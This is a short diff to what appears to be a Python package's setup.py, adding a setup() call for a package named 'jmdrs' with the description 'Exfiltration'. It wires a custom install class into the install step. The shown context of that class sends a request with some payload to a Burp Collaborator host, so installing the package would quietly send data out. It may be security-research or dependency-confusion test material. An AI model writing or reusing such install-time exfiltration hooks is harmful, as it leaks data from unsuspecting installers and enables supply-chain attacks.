@@ -15,5 +15,11 @@ class CustomInstall(install):
         requests.get("https://yourburpcolloboratorid.burpcollaborator.net",params = ploads)
 
 
-# setup(...) removed                                                                                                                                                                     
+setup(name='jmdrs',
+      version='1.0.4',
+      description='Exfiltration',
+      author='chawla',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
 
